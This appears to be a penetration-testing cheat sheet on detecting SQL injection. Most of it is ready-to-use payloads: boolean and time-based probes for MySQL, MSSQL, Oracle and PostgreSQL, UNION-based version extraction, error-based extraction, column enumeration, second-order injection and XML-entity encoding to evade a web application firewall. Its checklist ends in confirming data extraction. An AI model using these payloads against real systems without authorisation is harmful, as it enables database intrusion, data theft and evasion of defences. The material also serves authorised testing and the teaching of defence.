# SQL Injection Detection

## Injection Points

### Common Locations

| Location       | Example                                            |
| -------------- | -------------------------------------------------- |
| GET Parameter  | `GET /?id=1`                                       |
| POST Form Data | `username=admin&password=pass`                     |
| POST JSON      | `{"id": "1"}`                                      |
| POST XML       | `<id>1</id>`                                       |
| Cookie         | `Cookie: session=abc123`                           |
| HTTP Headers   | `Host`, `User-Agent`, `Referer`, `X-Forwarded-For` |

### HTTP Request Example

```http
GET /?id=1&category=gifts HTTP/1.1
Host: target.com
Cookie: session=abc; user=harold
User-Agent: Mozilla/5.0
X-Custom-Header: value
```

## Basic Detection Payloads

### Quote-based

```
'
"
`
')
")
`)
'))
"))
```

### Logic Testing

| Payload       | Expected        |
| ------------- | --------------- |
| `' OR '1'='1` | True            |
| `' OR '1'='2` | False           |
| `" OR "1"="1` | True            |
| `1 OR 1=1`    | True (numeric)  |
| `1 AND 1=2`   | False (numeric) |

### Arithmetic Testing

| Payload | Expected                    |
| ------- | --------------------------- |
| `1/1`   | Valid (returns 1)           |
| `1/0`   | Error or different response |
| `1*1`   | Valid                       |
| `1-0`   | Valid                       |

### Comment Testing

```sql
'--
'#
'/*
```

## DBMS Identification

### Version Queries

| DBMS       | Query                                         |
| ---------- | --------------------------------------------- |
| MySQL      | `SELECT @@version`                            |
| MSSQL      | `SELECT @@version`                            |
| Oracle     | `SELECT banner FROM v$version WHERE ROWNUM=1` |
| PostgreSQL | `SELECT version()`                            |

### Time-based Detection

| DBMS       | Payload                                      |
| ---------- | -------------------------------------------- |
| MySQL      | `' AND SLEEP(5)--`                           |
| MSSQL      | `'; WAITFOR DELAY '0:0:5'--`                 |
| Oracle     | `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--` |
| PostgreSQL | `'; SELECT pg_sleep(5)--`                    |

### Concatenation Detection

| DBMS       | Payload                  |
| ---------- | ------------------------ |
| MySQL      | `' 'test` (space concat) |
| MSSQL      | `'+'test`                |
| Oracle     | `'\|\|'test`             |
| PostgreSQL | `'\|\|'test`             |

### Error Message Hints

| Error Pattern                          | DBMS       |
| -------------------------------------- | ---------- |
| `You have an error in your SQL syntax` | MySQL      |
| `Unclosed quotation mark`              | MSSQL      |
| `ORA-XXXXX`                            | Oracle     |
| `ERROR: syntax error at or near`       | PostgreSQL |

## DBMS Fingerprinting

After detecting SQLi, identify the database system:

### Error Message Analysis (Best Method)

| Error Pattern                                                                                          | DBMS       | Confidence |
| ------------------------------------------------------------------------------------------------------ | ---------- | ---------- |
| `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version` | **MySQL**  | 100%       |
| `Warning: mysql_fetch_array()`                                                                         | MySQL      | 100%       |
| `Unclosed quotation mark after the character string`                                                   | MSSQL      | 90%        |
| `Microsoft SQL Native Client error`                                                                    | MSSQL      | 100%       |
| `ORA-01756: quoted string not properly terminated`                                                     | Oracle     | 100%       |
| `ERROR: syntax error at or near`                                                                       | PostgreSQL | 90%        |
| `PSQLException`                                                                                        | PostgreSQL | 100%       |

### Function-based Detection

Test DBMS-specific functions:

```sql
# MySQL
' AND SLEEP(5)--           → 5 second delay
' AND @@version--          → Returns version
' AND LENGTH(database())>0-- → True

# MSSQL
'; WAITFOR DELAY '0:0:5'-- → 5 second delay
' AND @@version--          → Returns version
' AND LEN(DB_NAME())>0--   → True

# Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- → 5 second delay
' FROM dual--              → Required, no error
' AND LENGTH(user)>0--     → True

# PostgreSQL
'; SELECT pg_sleep(5)--    → 5 second delay
' AND version()--          → Returns version
' AND LENGTH(current_database())>0-- → True
```

### Syntax Quirks

| DBMS       | Unique Syntax                                   |
| ---------- | ----------------------------------------------- |
| Oracle     | Requires `FROM dual` for queries without tables |
| MySQL      | Supports `LIMIT n,m`                            |
| MSSQL      | Uses `TOP n` instead of LIMIT                   |
| PostgreSQL | Supports `LIMIT n OFFSET m`                     |
| MySQL      | Comment: `#` or `-- ` (space required)          |
| Oracle     | String concat: `'a'\|\|'b'`                     |
| MSSQL      | String concat: `'a'+'b'`                        |

### Version Extraction (After DBMS Identified)

Once you know the DBMS:

```sql
# MySQL - Use full version for complete info
' UNION SELECT 1,VERSION(),3,4--
' UNION SELECT 1,@@version,3,4--
→ Returns: "5.7.44-0ubuntu0.18.04.1" (includes OS info)

# MSSQL
' UNION SELECT 1,@@version,3,4--
→ Returns full version with Windows version

# Oracle
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--
→ Returns: "Oracle Database 11g Enterprise Edition..."

# PostgreSQL
' UNION SELECT 1,version(),3,4--
→ Returns: "PostgreSQL 12.8 on x86_64-pc-linux-gnu..."
```

**⚠️ Note**: In Union-based, column may be truncated in HTML. Check:

- Description field might have `[:100]` truncation
- Use error-based or full visible column for complete version

## Injection Type Detection

### Error-based Check

```sql
' AND 1=CONVERT(int,@@version)--     -- MSSQL
' AND extractvalue(1,concat(0x7e,version()))--  -- MySQL
```

### Union-based Check

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Boolean Blind Check

```sql
' AND 1=1--    -- Should return normal
' AND 1=2--    -- Should return different/empty
```

### Time Blind Check

```sql
' AND SLEEP(5)--           -- MySQL
' AND pg_sleep(5)--        -- PostgreSQL
'; WAITFOR DELAY '0:0:5'-- -- MSSQL
```

## Column Count Detection

### ORDER BY Method

```sql
' ORDER BY 1--    -- Valid
' ORDER BY 2--    -- Valid
' ORDER BY 3--    -- Valid
' ORDER BY 4--    -- Error = 3 columns
```

### UNION NULL Method

```sql
' UNION SELECT NULL--           -- Error
' UNION SELECT NULL,NULL--      -- Error
' UNION SELECT NULL,NULL,NULL-- -- Success = 3 columns
```

## Data Type Detection

After finding column count (e.g., 3 columns):

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

String column = no error when inserting `'a'`

## Quick Detection Checklist

1. Add `'` to parameter - check for errors
2. Test `' OR '1'='1` vs `' OR '1'='2` - check response diff
3. Test time delays for DBMS identification
4. Enumerate columns with ORDER BY / UNION NULL
5. Identify string-compatible columns
6. Confirm with data extraction

## Second-Order SQL Injection

Second-order (stored) SQLi occurs when:

- User input is stored safely in database
- Later retrieved and used unsafely in a SQL query
- Common when developers trust "stored" data

### Detection

1. Submit payload that gets stored (e.g., username: `admin'--`)
2. Trigger functionality that uses stored data
3. Observe if payload executes in different context

### Example Flow

```
1. Register user: username = "admin'--"
   -> Stored safely with prepared statement

2. View profile page that displays: "Welcome [username]"
   -> Query: SELECT * FROM posts WHERE author = '[username]'
   -> Becomes: SELECT * FROM posts WHERE author = 'admin'--'
   -> SQLi executes!
```

## XML/JSON Context Injection

### JSON

```json
{"id": "1' OR '1'='1'--"}
{"username": "admin'--"}
```

### XML Escape Sequences

Bypass WAF by encoding SQL keywords:

```xml
<!-- Normal (blocked) -->
<id>1 UNION SELECT 1,2,3</id>

<!-- XML entity encoding -->
<id>1 &#x55;NION SELECT 1,2,3</id>
<id>1 &#85;NION SELECT 1,2,3</id>

<!-- Full example -->
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
```

Server decodes before passing to SQL interpreter.
